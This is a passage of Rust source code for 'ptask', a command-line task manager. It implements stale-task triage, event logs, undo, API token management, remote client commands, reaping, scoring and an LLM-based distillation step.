            ui::section("clean board", ui::Ink::Green, "nothing stale")
        );
        return Ok(());
    }
    if !std::io::stdin().is_terminal() {
        for (_, pt, title, status, updated) in &stale {
            println!(
                "{}",
                ui::bullet(
                    pt.as_deref().unwrap_or("-"),
                    ui::painted(format!(
                        "{}  {}  {}",
                        ui::status_pill(status),
                        ui::paint(title, ui::Ink::Paper),
                        ui::dim(
                            &format!("last touch {}", updated.get(..10).unwrap_or(updated)),
                            ui::Ink::Slate
                        )
                    )),
                    ui::Ink::Amber,
                    8
                )
            );
        }
        println!(
            "{}",
            ui::note("interactive triage needs a TTY: k=keep d=done x=dismiss s=snooze-1w q=quit")
        );
        return Ok(());
    }

    println!(
        "{}",
        ui::note("[k]eep  [d]one  [x] dismiss  [s]nooze 1w  [q]uit")
    );
    println!();
    for (uuid, pt, title, status, updated) in &stale {
        print!(
            "{}",
            ui::prompt(
                ui::painted(format!(
                    "{}  {}  {}  {}",
                    ui::pt_id(pt.as_deref().unwrap_or("-")),
                    ui::status_pill(status),
                    ui::paint(title, ui::Ink::Paper),
                    ui::dim(
                        &format!("last {}", updated.get(..10).unwrap_or(updated)),
                        ui::Ink::Slate
                    )
                )),
                "[k/d/x/s/q]"
            )
        );
        std::io::stdout().flush().ok();
        let mut line = String::new();
        std::io::stdin().read_line(&mut line)?;
        match line.trim() {
            // A refused action (e.g. done on a blocked task) is reported and
            // the sweep continues; it used to end the whole session.
            "d" => {
                let done = tasks::resolve_for_lookup(db, uuid, true)
                    .and_then(|t| tasks::mark_done(db, &t, &task_ctx(uuid)));
                match done {
                    Ok(tasks::DoneOutcome::Completed) => {
                        println!("      {}", ui::pill(ui::Status::Ok, "done"))
                    }
                    Ok(tasks::DoneOutcome::Advanced { next_deadline }) => {
                        println!(
                            "      {}",
                            ui::pill(ui::Status::Changed, &format!("advanced to {next_deadline}"))
                        )
                    }
                    Err(e) => println!("      {}", ui::pill(ui::Status::Bad, &e.to_string())),
                }
            }
            "x" => match tasks::dismiss(db, uuid, &task_ctx(uuid)) {
                Ok(()) => println!("      {}", ui::pill(ui::Status::Mute, "dismissed")),
                Err(e) => println!("      {}", ui::pill(ui::Status::Bad, &e.to_string())),
            },
            "s" => {
                let until = ptask_core::dates::now_in_operator_tz()
                    .map_err(anyhow::Error::msg)?
                    .checked_add(ptask_core::jiff::Span::new().days(7))
                    .map_err(|e| anyhow::anyhow!("snooze math: {e}"))?;
                match tasks::snooze(
                    db,
                    uuid,
                    &ptask_core::dates::format_iso(&until),
                    &task_ctx(uuid),
                ) {
                    Ok(_) => println!("      {}", ui::pill(ui::Status::Mute, "snoozed 1 week")),
                    Err(e) => println!("      {}", ui::pill(ui::Status::Bad, &e.to_string())),
                }
            }
            "q" => break,
            _ => {}
        }
    }
    Ok(())
}

fn cmd_log(db: &Db, a: LogArgs) -> Result<()> {
    let task = tasks::resolve_for_lookup(db, &a.query, true).map_err(anyhow::Error::msg)?;
    let pt = task.pt_id.as_deref().unwrap_or_else(|| short_id(&task.id));
    let events = ptask_core::event_log::history_for_task(db, &task.id, a.limit)?;
    if json_mode() {
        crate::print_json(&events)?;
        return Ok(());
    }
    print_lines(ui::headline(
        &format!("ptask · log {pt}"),
        None,
        &format!("{} · newest first", ui::clip(&task.title, 60)),
    ));
    if events.is_empty() {
        println!("{}", ui::empty("no journal events"));
        return Ok(());
    }
    let width = ui::term_width();
    let fixed = ui::table_width(&[
        ui::Column::new("", 16),
        ui::Column::new("", 22),
        ui::Column::new("", 12),
    ]) + 3;
    let cols = [
        ui::Column::new("WHEN", 16),
        ui::Column::new("EVENT", 22),
        ui::Column::new("ACTOR", 12),
        ui::Column::new("DETAIL", width.saturating_sub(fixed).max(24)),
    ];
    let rows: Vec<Vec<String>> = events
        .iter()
        .map(|e| {
            // ts to the minute is enough for a human trail
            vec![
                ui::paint(e.ts.get(..16).unwrap_or(&e.ts), ui::Ink::Steel),
                ui::paint(&e.event_type, ui::Ink::Paper),
                ui::paint(e.actor.as_deref().unwrap_or("-"), ui::Ink::Cyan),
                ui::paint(&summarize_payload(&e.payload), ui::Ink::Slate),
            ]
        })
        .collect();
    let n = rows.len();
    print_lines(ui::table(
        &cols,
        &ui::painted_rows(rows),
        &Default::default(),
    ));
    println!("{}", ui::footer(n, "event", ""));
    Ok(())
}

fn cmd_flux(db: &Db, a: FluxArgs) -> Result<()> {
    let minutes = ptask_core::flux::parse_window(&a.since).map_err(anyhow::Error::msg)?;
    let r = ptask_core::flux::by_actor(db, minutes)?;
    if json_mode() {
        return crate::print_json(&r);
    }
    print_lines(ui::headline(
        &format!("ptask · flux {}", a.since.trim()),
        None,
        &format!(
            "+{} opened · −{} closed · net {:+} · since {}",
            r.total.created + r.total.reopened,
            r.total.done + r.total.dismissed,
            r.total.net,
            r.since.get(..16).unwrap_or(&r.since).replace('T', " ")
        ),
    ));
    if r.actors.is_empty() {
        println!(
            "{}",
            ui::empty("no task created, closed or reopened in the window")
        );
        return Ok(());
    }
    let cols = [
        ui::Column::new("ACTOR", 16),
        ui::Column::new("CREATED", 7),
        ui::Column::new("DONE", 6),
        ui::Column::new("DISMISSED", 9),
        ui::Column::new("REOPENED", 8),
        ui::Column::new("NET", 6),
    ];
    let row = |f: &ptask_core::flux::ActorFlux| {
        // A positive net grew the backlog: amber, so it stands out.
        let net = format!("{:+}", f.net);
        vec![
            ui::paint(&f.actor, ui::Ink::Cyan),
            f.created.to_string(),
            f.done.to_string(),
            f.dismissed.to_string(),
            f.reopened.to_string(),
            if f.net > 0 {
                ui::paint(&net, ui::Ink::Amber)
            } else {
                ui::paint(&net, ui::Ink::Green)
            },
        ]
    };
    let mut rows: Vec<Vec<String>> = r.actors.iter().map(row).collect();
    rows.push(row(&r.total));
    print_lines(ui::table(
        &cols,
        &ui::painted_rows(rows),
        &Default::default(),
    ));
    println!(
        "{}",
        ui::footer(
            r.actors.len(),
            "actor",
            "net = created + reopened − done − dismissed"
        )
    );
    Ok(())
}

/// One-line human summary of an event payload (drop envelope keys).
fn summarize_payload(payload: &str) -> String {
    let Ok(v) = serde_json::from_str::<serde_json::Value>(payload) else {
        return String::new();
    };
    let mut parts = Vec::new();
    if let Some(obj) = v.as_object() {
        for (k, val) in obj {
            if matches!(
                k.as_str(),
                "actor" | "source" | "task_uuid" | "pt_id" | "note"
            ) {
                continue;
            }
            parts.push(format!("{}={}", k, val));
            if parts.len() >= 3 {
                break;
            }
        }
        // A note is prose, not a field: shown as text (one line), last.
        if let Some(note) = obj.get("note").and_then(|n| n.as_str()) {
            parts.push(format!("“{}”", ui::one_line(note)));
        }
    }
    parts.join(" ")
}

fn cmd_undo(db: &Db, a: UndoArgs) -> Result<()> {
    let ctx = cli_ctx();
    let plan = tasks::undo_plan(db, &ctx).map_err(anyhow::Error::msg)?;
    let handle = plan
        .pt_id
        .clone()
        .unwrap_or_else(|| short_id(&plan.task_uuid).to_string());
    if plan.action == tasks::UndoAction::DeleteCreated && !a.yes {
        // Same gate as `pt rm`: undoing a create is a permanent delete, and
        // with no TTY to confirm, refuse rather than delete silently.
        if json_mode() || !std::io::stdin().is_terminal() {
            anyhow::bail!(
                "refusing to undo the creation of {handle} without --yes: it would be deleted permanently (no TTY to confirm)"
            );
        }
        use std::io::Write;
        print!(
            "{}",
            ui::prompt(
                format!(
                    "undo the creation of {handle} \"{}\"? It will be deleted permanently.",
                    plan.title
                ),
                "[y/N]"
            )
        );
        std::io::stdout().flush().ok();
        let mut line = String::new();
        std::io::stdin().read_line(&mut line).ok();
        if !matches!(line.trim().to_ascii_lowercase().as_str(), "y" | "yes") {
            anyhow::bail!("aborted: {handle} not deleted");
        }
    }
    let out = tasks::undo_planned(db, &ctx, &plan).map_err(anyhow::Error::msg)?;
    emit(
        &serde_json::json!({
            "description": out.description,
            "reversed_event_id": out.reversed_event_id,
            "task_uuid": out.task_uuid,
            "pt_id": out.pt_id,
            "title": out.title,
            "action": out.action.verb(),
            "was": out.action.reversed(),
        }),
        || {
            println!(
                "{}",
                ui::outcome(
                    if out.action == tasks::UndoAction::DeleteCreated {
                        ui::Status::Bad
                    } else {
                        ui::Status::Changed
                    },
                    out.action.verb(),
                    &handle,
                    &out.title,
                    &format!(
                        "undo · was {} · reversed event #{}",
                        out.action.reversed(),
                        out.reversed_event_id
                    )
                )
            )
        },
    )
}

fn cmd_approval(db: &Db, c: approvals::ApprovalCommand) -> Result<()> {
    match c {
        approvals::ApprovalCommand::Request(a) => {
            approvals::cmd_request(db, a, cli_ctx(), json_mode())
        }
        approvals::ApprovalCommand::List(a) => approvals::cmd_list(db, a, json_mode()),
        approvals::ApprovalCommand::Show(a) => approvals::cmd_show(db, a, json_mode()),
        approvals::ApprovalCommand::Payload(a) => approvals::cmd_payload(db, a),
        approvals::ApprovalCommand::Withdraw(a) => {
            approvals::cmd_withdraw(db, a, cli_ctx(), json_mode())
        }
        approvals::ApprovalCommand::Verify(a) => approvals::cmd_verify(db, a),
        approvals::ApprovalCommand::Consume(a) => approvals::cmd_consume(db, a, cli_ctx()),
        approvals::ApprovalCommand::Expire => approvals::cmd_expire(db, cli_ctx()),
        approvals::ApprovalCommand::Notify => approvals::cmd_notify(db),
        approvals::ApprovalCommand::Decide(a) => {
            approvals::cmd_long_decide(db, a, cli_ctx(), json_mode())
        }
    }
}

fn cmd_token(db: &Db, c: TokenCommand) -> Result<()> {
    use ptask_core::tokens;
    match c {
        TokenCommand::Create(a) => {
            let scope = tokens::Scope::parse(&a.scope).ok_or_else(|| {
                anyhow::anyhow!("invalid scope {:?} (read|capture|write|admin)", a.scope)
            })?;
            let plain = tokens::create(db, &a.client_id, scope)?;
            println!(
                "{}",
                ui::outcome(
                    ui::Status::Ok,
                    "minted",
                    &a.client_id,
                    &format!("scope {}", scope.as_str()),
                    "token"
                )
            );
            println!();
            println!("  {}", ui::bold(&plain, ui::Ink::Paper));
            println!();
            println!(
                "{}",
                ui::section(
                    "shown once",
                    ui::Ink::Amber,
                    "store it with the consumer now"
                )
            );
            Ok(())
        }
        TokenCommand::List => {
            let infos = tokens::list(db)?;
            print_lines(ui::headline("ptask · tokens", None, "API clients"));
            if infos.is_empty() {
                println!("{}", ui::empty("no tokens minted"));
                return Ok(());
            }
            let cols = [
                ui::Column::new("CLIENT", 18),
                ui::Column::new("SCOPE", 8),
                ui::Column::new("STATE", 10),
                ui::Column::new("CREATED", 16),
                ui::Column::new("LAST USED", 16),
            ];
            let rows: Vec<Vec<String>> = infos
                .iter()
                .map(|t| {
                    vec![
                        ui::paint(&t.client_id, ui::Ink::Paper),
                        ui::paint(&t.scopes, ui::Ink::Steel),
                        if t.revoked_at.is_some() {
                            ui::pill(ui::Status::Bad, "revoked")
                        } else {
                            ui::pill(ui::Status::Ok, "active")
                        },
                        ui::paint(
                            t.created_at.get(..16).unwrap_or(&t.created_at),
                            ui::Ink::Steel,
                        ),
                        ui::paint(
                            t.last_used_at
                                .as_deref()
                                .map(|s| s.get(..16).unwrap_or(s))
                                .unwrap_or("never"),
                            ui::Ink::Slate,
                        ),
                    ]
                })
                .collect();
            let n = rows.len();
            print_lines(ui::table(
                &cols,
                &ui::painted_rows(rows),
                &Default::default(),
            ));
            println!("{}", ui::footer(n, "token", ""));
            Ok(())
        }
        TokenCommand::Revoke(a) => {
            let n = tokens::revoke(db, &a.client_id)?;
            if n == 0 {
                anyhow::bail!("no active tokens for {:?}", a.client_id);
            }
            println!(
                "{}",
                ui::outcome(
                    ui::Status::Bad,
                    "revoked",
                    &a.client_id,
                    &format!("{n} token(s)"),
                    ""
                )
            );
            Ok(())
        }
    }
}

fn cmd_gen_manpage() -> Result<()> {
    let cmd = <Cli as clap::CommandFactory>::command();
    let man = clap_mangen::Man::new(cmd);
    let mut buf: Vec<u8> = Vec::new();
    man.render(&mut buf).context("render manpage")?;
    std::io::Write::write_all(&mut std::io::stdout().lock(), &buf).context("write manpage")?;
    Ok(())
}

fn cmd_gen_completions(args: GenCompletionsArgs) -> Result<()> {
    use clap_complete::Shell;
    let shell = match args.shell {
        ShellChoice::Bash => Shell::Bash,
        ShellChoice::Zsh => Shell::Zsh,
        ShellChoice::Fish => Shell::Fish,
    };
    let mut cmd = <Cli as clap::CommandFactory>::command();
    clap_complete::generate(shell, &mut cmd, "pt", &mut std::io::stdout().lock());
    Ok(())
}

fn cmd_remote(c: RemoteCommand) -> Result<()> {
    match c {
        RemoteCommand::Add(a) => {
            let client = remote_client(a.url.as_deref())?;
            let task = client.add(&a.text)?;
            emit(&task, || {
                // Echo the parsed interpretation (priority + deadline) so a silent
                // mis-parse — the PT-653 class — is visible at the moment of creation.
                println!(
                    "{}",
                    ui::outcome(
                        ui::Status::Ok,
                        "created",
                        task.pt_id.as_deref().unwrap_or_else(|| short_id(&task.id)),
                        &task.title,
                        "remote"
                    )
                );
                let mut pairs: Vec<(&str, ui::Cell)> =
                    vec![("priority", ui::painted(ui::priority_pill(task.priority)))];
                if let Some(d) = &task.deadline {
                    pairs.push(("deadline", ui::painted(ui::due_cell(Some(d)))));
                }
                for l in ui::kv(&pairs, 14) {
                    println!("    {}", l.trim_start());
                }
            })
        }
        RemoteCommand::List(a) => {
            let client = remote_client(a.url.as_deref())?;
            let priority_filter = a
                .priority
                .as_deref()
                .map(priority::parse)
                .transpose()
                .context("parsing --priority")?;
            // Server-side /list either way: -p used to be dropped whenever
            // -f was given, and the unfiltered path downloaded every task and
            // sorted newest-first instead of local `pt list`'s severity order.
            let filter = remote_list_filter(a.filter.as_deref(), priority_filter);
            let tasks_out = client.list_filtered(filter.as_deref(), &a.status, a.limit)?;
            if json_mode() {
                crate::print_json(&tasks_out)?;
                return Ok(());
            }
            let mut note = format!("{} · {}", a.status, client.url());
            if let Some(f) = a.filter.as_deref() {
                note.push_str(&format!(" · filter {f:?}"));
            }
            print_lines(ui::headline(
                "ptask · list",
                Some(("remote", ui::Ink::Violet)),
                &note,
            ));
            if tasks_out.is_empty() {
                println!("{}", ui::empty("no tasks"));
                return Ok(());
            }
            print_lines(ui::task_table(&tasks_out, false, true, false));
            println!("{}", ui::footer(tasks_out.len(), "task", ""));
            Ok(())
        }
        RemoteCommand::Done(a) => {
            let client = remote_client(a.url.as_deref())?;
            let task = client.done(&a.query, a.note.as_deref())?;
            emit(
                &remote_outcome(&task, "done", serde_json::json!({})),
                || {
                    println!(
                        "{}",
                        ui::outcome(
                            ui::Status::Ok,
                            "done",
                            task.pt_id.as_deref().unwrap_or_else(|| short_id(&task.id)),
                            &task.title,
                            "remote"
                        )
                    )
                },
            )
        }
        RemoteCommand::Priority(a) => {
            let client = remote_client(a.url.as_deref())?;
            let level = priority::parse(&a.level).map_err(anyhow::Error::msg)?;
            let task = client.priority(&a.query, level)?;
            let out = remote_outcome(
                &task,
                "priority",
                serde_json::json!({ "priority": task.priority }),
            );
            emit(&out, || {
                println!(
                    "{}",
                    ui::outcome(
                        ui::Status::Changed,
                        "priority",
                        task.pt_id.as_deref().unwrap_or_else(|| short_id(&task.id)),
                        &task.title,
                        &format!(
                            "{} ({}) · remote",
                            task.priority,
                            priority::label(task.priority)
                        )
                    )
                )
            })
        }
        RemoteCommand::Edit(a) => {
            if a.deadline.is_some() && a.clear_deadline {
                anyhow::bail!("use either --deadline or --clear-deadline, not both");
            }
            let has_deadline = a.deadline.is_some() || a.clear_deadline;
            let has_text = a.title.is_some() || a.desc.is_some();
            if !has_deadline && !has_text {
                anyhow::bail!(
                    "nothing to edit; use --deadline DATE | --clear-deadline | --title T | --desc D"
                );
            }
            let client = remote_client(a.url.as_deref())?;
            // Resolve ONCE: a single /sync request carries both the title/desc
            // and deadline commands against the same resolved task_uuid, so a
            // rename can't drift the deadline onto a different task.
            let deadline_op = if a.clear_deadline {
                Some(None)
            } else {
                a.deadline.as_deref().map(Some)
            };
            let task = client.edit(&a.query, a.title.as_deref(), a.desc.as_deref(), deadline_op)?;
            let pt = task
                .pt_id
                .as_deref()
                .unwrap_or_else(|| short_id(&task.id))
                .to_string();
            let mut parts = Vec::new();
            if has_deadline {
                parts.push(format!(
                    "deadline → {}",
                    task.deadline.as_deref().unwrap_or("--")
                ));
            }
            if a.title.is_some() {
                parts.push("title".to_string());
            }
            if a.desc.is_some() {
                parts.push("description".to_string());
            }
            let out = remote_outcome(
                &task,
                "edit",
                serde_json::json!({ "edited": parts, "deadline": task.deadline }),
            );
            emit(&out, || {
                println!(
                    "{}",
                    ui::outcome(
                        ui::Status::Changed,
                        "edited",
                        &pt,
                        &task.title,
                        &format!("{} · remote", parts.join(" + "))
                    )
                )
            })
        }
        RemoteCommand::Reopen(a) => {
            let client = remote_client(a.url.as_deref())?;
            let task = client.reopen(&a.query)?;
            let out = remote_outcome(
                &task,
                "reopen",
                serde_json::json!({ "status": task.status }),
            );
            emit(&out, || {
                println!(
                    "{}",
                    ui::outcome(
                        ui::Status::Changed,
                        "reopened",
                        task.pt_id.as_deref().unwrap_or_else(|| short_id(&task.id)),
                        &task.title,
                        &format!("→ {} · remote", task.status)
                    )
                )
            })
        }
        RemoteCommand::Show(a) => {
            let client = remote_client(a.url.as_deref())?;
            let t = client.show(&a.query)?;
            // Rich side-table detail (best-effort: a pre-v1.9 server has no
            // /detail route, so just skip it and keep the base row).
            let d = client.detail(&t.id).ok();
            let mut v = serde_json::to_value(&t)?;
            v["detail"] = serde_json::to_value(&d)?;
            emit(&v, || print_lines(render_show(&t, d.as_ref(), &[], &[])))
        }
        RemoteCommand::Next(a) => {
            let client = remote_client(a.url.as_deref())?;
            let rows = client.next(a.limit)?;
            if json_mode() {
                crate::print_json(&rows)?;
                return Ok(());
            }
            print_lines(ui::headline(
                "ptask · next",
                Some(("remote", ui::Ink::Violet)),
                &format!("unblocked, highest first · {}", client.url()),
            ));
            if rows.is_empty() {
                println!("{}", ui::empty("no ready tasks"));
                return Ok(());
            }
            print_lines(ui::task_table(&rows, false, true, false));
            println!("{}", ui::footer(rows.len(), "ready task", ""));
            Ok(())
        }
        RemoteCommand::Dismiss(a) => {
            let client = remote_client(a.url.as_deref())?;
            let task = client.dismiss(&a.query, a.note.as_deref())?;
            let out = remote_outcome(
                &task,
                "dismiss",
                serde_json::json!({ "status": task.status }),
            );
            emit(&out, || {
                println!(
                    "{}",
                    ui::outcome(
                        ui::Status::Mute,
                        "dismissed",
                        task.pt_id.as_deref().unwrap_or_else(|| short_id(&task.id)),
                        &task.title,
                        "remote"
                    )
                )
            })
        }
        RemoteCommand::Note(a) => {
            let text = note_text(&a.text)?;
            let client = remote_client(a.url.as_deref())?;
            let task = client.note(&a.query, &text)?;
            emit(
                &remote_outcome(&task, "note", serde_json::json!({})),
                || {
                    println!(
                        "{}",
                        ui::outcome(
                            ui::Status::Ok,
                            "noted",
                            task.pt_id.as_deref().unwrap_or_else(|| short_id(&task.id)),
                            &task.title,
                            "remote"
                        )
                    )
                },
            )
        }
        RemoteCommand::Start(a) => {
            let client = remote_client(a.url.as_deref())?;
            let task = client.start(&a.query)?;
            let out = remote_outcome(
                &task,
                "start",
                serde_json::json!({ "status": "in_progress" }),
            );
            emit(&out, || {
                println!(
                    "{}",
                    ui::outcome(
                        ui::Status::Busy,
                        "started",
                        task.pt_id.as_deref().unwrap_or_else(|| short_id(&task.id)),
                        &task.title,
                        "in progress · remote"
                    )
                )
            })
        }
        RemoteCommand::Snooze(a) => {
            let client = remote_client(a.url.as_deref())?;
            let phrase = a.until.join(" ");
            let until = ptask_core::dates::parse(&phrase).map_err(anyhow::Error::msg)?;
            let until_iso = ptask_core::dates::format_iso(&until);
            let task = client.snooze(&a.query, &until_iso)?;
            let out = remote_outcome(
                &task,
                "snooze",
                serde_json::json!({ "status": "snoozed", "snoozed_until": until_iso }),
            );
            emit(&out, || {
                println!(
                    "{}",
                    ui::outcome(
                        ui::Status::Mute,
                        "snoozed",
                        task.pt_id.as_deref().unwrap_or_else(|| short_id(&task.id)),
                        &task.title,
                        &format!("until {until_iso} · remote")
                    )
                )
            })
        }
        RemoteCommand::Depend(a) => {
            let client = remote_client(a.url.as_deref())?;
            let task = client.depend(&a.query, &a.on, a.clear)?;
            let out = remote_outcome(
                &task,
                "depend",
                serde_json::json!({
                    "on": a.on,
                    "edge": if a.clear { "removed" } else { "added" },
                }),
            );
            emit(&out, || {
                println!(
                    "{}",
                    ui::outcome(
                        if a.clear {
                            ui::Status::Mute
                        } else {
                            ui::Status::Changed
                        },
                        if a.clear { "cleared" } else { "depends" },
                        task.pt_id.as_deref().unwrap_or_else(|| short_id(&task.id)),
                        &task.title,
                        &format!("on {} · remote", a.on)
                    )
                )
            })
        }
        RemoteCommand::Rm(a) => {
            let client = remote_client(a.url.as_deref())?;
            let task = client.rm(&a.query, |task| {
                if a.yes {
                    return Ok(());
                }
                let pt = task.pt_id.as_deref().unwrap_or_else(|| short_id(&task.id));
                confirm_delete(pt, &task.title)
            })?;
            let out = remote_outcome(&task, "rm", serde_json::json!({ "deleted": true }));
            emit(&out, || {
                println!(
                    "{}",
                    ui::outcome(
                        ui::Status::Bad,
                        "deleted",
                        task.pt_id.as_deref().unwrap_or_else(|| short_id(&task.id)),
                        &task.title,
                        "permanent · remote"
                    )
                )
            })
        }
        RemoteCommand::Version(a) => {
            let client = remote_client(a.url.as_deref())?;
            let local = ptask_core::VERSION;
            let server = client.server_version();
            let out = serde_json::json!({
                "url": client.url(),
                "client": local,
                "server": server,
                "in_sync": server.as_deref() == Some(local),
            });
            emit(&out, || {
                print_lines(ui::headline("ptask · version", None, client.url()));
                if let Some(server) = &server {
                    print_lines(ui::kv(
                        &[
                            ("client", format!("v{local}").into()),
                            ("server", format!("v{server}").into()),
                        ],
                        14,
                    ));
                    println!(
                        "{}",
                        if server == local {
                            ui::section("in sync", ui::Ink::Green, "")
                        } else {
                            ui::section("version skew", ui::Ink::Red, "redeploy pt")
                        }
                    );
                }
            })?;
            match server {
                Some(server) if server == local => Ok(()),
                Some(server) => {
                    anyhow::bail!(
                        "client/server version skew (v{local} vs v{server}) — \
                         redeploy pt (scripts/ansible/ptask.yml)"
                    )
                }
                None => anyhow::bail!("server unreachable or predates GET /version"),
            }
        }
    }
}

fn cmd_reap(db: &Db, a: ReapArgs) -> Result<()> {
    let ctx = ptask_core::event_log::EventCtx::system("reap");
    let report = ptask_core::reap::run(db, a.dry_run, &ctx)?;
    // Core lists only successful dismisses in `reaped` and the failed ones
    // in `failed`, so the attempted count is their sum. Any failure fails
    // the unit (the reaper's OnFailure alert fires on a non-zero exit), even
    // when nothing was dismissed.
    let attempted = report.reaped.len() + report.errors;
    let outcome = || {
        if report.errors == 0 {
            return Ok(());
        }
        Err(anyhow::anyhow!(
            "reap: {} of {attempted} dismiss(es) failed",
            report.errors
        ))
    };
    if a.json {
        print_json(&report)?;
        return outcome();
    }
    if attempted == 0 {
        println!(
            "{}",
            ui::section("reap ok", ui::Ink::Green, "nothing stale")
        );
        return Ok(());
    }
    let row = |status, verb, r: &ptask_core::reap::Reaped, extra: &str| {
        println!(
            "{}",
            ui::outcome(
                status,
                verb,
                r.pt_id.as_deref().unwrap_or(&r.uuid),
                &r.title,
                &format!("[{}] idle since {}{extra}", r.source_type, r.updated_at)
            )
        );
    };
    for r in &report.reaped {
        if report.dry_run {
            row(ui::Status::Warn, "would drop", r, "");
        } else {
            row(ui::Status::Mute, "dismissed", r, "");
        }
    }
    for f in &report.failed {
        row(
            ui::Status::Bad,
            "failed",
            &f.task,
            &format!(" · {}", f.error),
        );
    }
    let summary = if report.errors > 0 {
        format!(
            "{} of {attempted} dismissed, {} failed · reverse with `pt reopen <PT-N>`",
            report.reaped.len(),
            report.errors
        )
    } else {
        format!(
            "{} task(s){} · reverse with `pt reopen <PT-N>`",
            report.reaped.len(),
            if report.dry_run { " (dry-run)" } else { "" }
        )
    };
    println!(
        "{}",
        if report.errors > 0 {
            ui::section("reap failed", ui::Ink::Red, &summary)
        } else {
            ui::section("reap ok", ui::Ink::Green, &summary)
        }
    );
    outcome()
}

fn cmd_scoring(db: &Db, c: ScoringCommand) -> Result<()> {
    match c {
        ScoringCommand::Run(a) => {
            if a.diff {
                print_rank_diff(db)?;
            }
            let now = ptask_core::dates::now_in_operator_tz().map_err(anyhow::Error::msg)?;
            // Expired claims go back to todo before scoring, so they rank
            // as open work in this pass. Only when the operator turned it
            // on: it changes task state on a timer.
            if ptask_core::Config::from_env().claim_reclaim && !a.dry_run {
                let r = ptask_core::claims::reclaim_expired(
                    db,
                    false,
                    &ptask_core::event_log::EventCtx::system("reclaim"),
                )?;
                if !r.reclaimed.is_empty() {
                    println!(
                        "{}",
                        ui::section(
                            "reclaimed",
                            ui::Ink::Amber,
                            &format!("{} expired claim(s) returned to todo", r.reclaimed.len())
                        )
                    );
                }
            }
            let report = ptask_core::scoring::run_once_at_mode(db, a.dry_run, &now, !a.v1)?;
            println!(
                "{}",
                ui::section(
                    "scoring ok",
                    ui::Ink::Green,
                    &format!(
                        "{} tasks scored{}{}",
                        report.tasks_scored,
                        if report.dry_run { " (dry-run)" } else { "" },
                        if a.v1 { " (v1 formula)" } else { "" }
                    )
                )
            );
            Ok(())
        }
    }
}

/// Top-20 by a fresh v2 score, each row's move against the stored ordering
/// (whatever the last scoring run wrote). Nothing is written.
fn print_rank_diff(db: &Db) -> Result<()> {
    let now = ptask_core::dates::now_in_operator_tz().map_err(anyhow::Error::msg)?;
    let conn = db.get()?;
    let mut stmt = conn.prepare(
        "SELECT id, pt_id, title, priority_score FROM tasks
         WHERE status NOT IN ('done','dismissed')",
    )?;
    let rows: Vec<(String, Option<String>, String, f64)> = stmt
        .query_map([], |r| Ok((r.get(0)?, r.get(1)?, r.get(2)?, r.get(3)?)))?
        .collect::<std::result::Result<_, _>>()?;
    drop(stmt);
    drop(conn);
    let mut stored_rank: Vec<(&String, f64)> = rows.iter().map(|(id, _, _, s)| (id, *s)).collect();
    stored_rank.sort_by(|a, b| b.1.partial_cmp(&a.1).unwrap_or(std::cmp::Ordering::Equal));
    let stored_pos: std::collections::HashMap<&String, usize> = stored_rank
        .iter()
        .enumerate()
        .map(|(i, (id, _))| (*id, i + 1))
        .collect();

    // One pass for every fresh score; per-task `why` rescored the whole set
    // for each task.
    let fresh: std::collections::HashMap<String, f64> =
        ptask_core::scoring::composites_v2(db, &now)?
            .into_iter()
            .collect();
    let mut v2_scores: Vec<(&String, &Option<String>, &String, f64)> = rows
        .iter()
        .filter_map(|(id, pt, title, _)| fresh.get(id).map(|s| (id, pt, title, *s)))
        .collect();
    v2_scores.sort_by(|a, b| b.3.partial_cmp(&a.3).unwrap_or(std::cmp::Ordering::Equal));
    print_lines(ui::headline(
        "ptask · rank diff",
        None,
        "fresh v2 top-20 vs the stored ordering",
    ));
    let width = ui::term_width();
    let fixed = ui::table_width(&[
        ui::Column::new("", 3),
        ui::Column::new("", 7),
        ui::Column::new("", 6),
        ui::Column::new("", 5),
    ]) + 3;
    let cols = [
        ui::Column::right("#", 3),
        ui::Column::new("ID", 7),
        ui::Column::right("SCORE", 6),
        ui::Column::right("MOVE", 5),
        ui::Column::new("TITLE", width.saturating_sub(fixed).max(24)),
    ];
    let rows: Vec<Vec<String>> = v2_scores
        .iter()
        .take(20)
        .enumerate()
        .map(|(i, (id, pt, title, score))| {
            let old = stored_pos.get(*id).copied().unwrap_or(0);
            let delta = old as i64 - (i as i64 + 1);
            let mv = match delta.signum() {
                1 => ui::paint(&format!("↑{}", delta.abs()), ui::Ink::Green),
                -1 => ui::paint(&format!("↓{}", delta.abs()), ui::Ink::Amber),
                _ => ui::dim("=", ui::Ink::Slate),
            };
            vec![
                ui::paint(&(i + 1).to_string(), ui::Ink::Steel),
                ui::pt_id(pt.as_deref().unwrap_or("-")),
                ui::paint(&format!("{score:.3}"), ui::Ink::Paper),
                mv,
                ui::paint(title, ui::Ink::Paper),
            ]
        })
        .collect();
    print_lines(ui::table(
        &cols,
        &ui::painted_rows(rows),
        &Default::default(),
    ));
    Ok(())
}

fn cmd_distill_native(db: &Db, batch: usize) -> Result<()> {
    use ptask_distill::providers::{GeminiProvider, LlmProvider, OpenAiCompatProvider};
    let cfg = ptask_core::Config::from_env().distill;
    let provider: Box<dyn LlmProvider> = match cfg.llm_backend.as_str() {
        "local" => Box::new(OpenAiCompatProvider::new(
            cfg.local_llm_url,
            cfg.local_llm_model,
        )?),
        "gemini" => {
            let Some(key) = cfg.gemini_api_key else {
                eprintln!("distill: GOOGLE_API_KEY is not set — failing closed (exit 3)");
                std::process::exit(3);
            };
            Box::new(GeminiProvider::new(key, cfg.gemini_model)?)
        }
        other => anyhow::bail!(
            "unsupported PTASK_LLM_BACKEND={other:?} — expected \"local\" or \"gemini\""
        ),
    };
    let provider_name = provider.name();
    match ptask_distill::pipeline::run_native(db, provider.as_ref(), batch) {
        Ok(r) => {
            println!(
                "{}",
                ui::section(
                    "distill ok",
                    if r.failed > 0 {
                        ui::Ink::Amber
                    } else {
                        ui::Ink::Green
                    },
                    &format!(
                        "{} · consumed {} · kept {} · created {} · deduped {} · failed {} · {}ms",
                        provider_name,
                        r.consumed,
                        r.kept,
                        r.created,
                        r.skipped_dedup,
                        r.failed,
                        r.duration_ms
                    )
                )
            );
            if r.sourceless_candidates > 0 {
                println!(
                    "  {} candidate(s) came back without sources — the model is ignoring \
                     the consolidation schema; their captures were re-walked",
                    r.sourceless_candidates
                );
            }
            if r.quarantined > 0 {
                println!(
                    "  {} capture(s) quarantined after {} failed attempts — \
                     inspect: SELECT id, distill_error FROM raw_items \
                     WHERE processed=0 AND distill_attempts>={}",
                    r.quarantined,
                    ptask_core::raw_items::MAX_DISTILL_ATTEMPTS,
                    ptask_core::raw_items::MAX_DISTILL_ATTEMPTS
                );
            }
            Ok(())
        }
        Err(e) if e.is::<ptask_distill::pipeline::DistillBusy>() => {
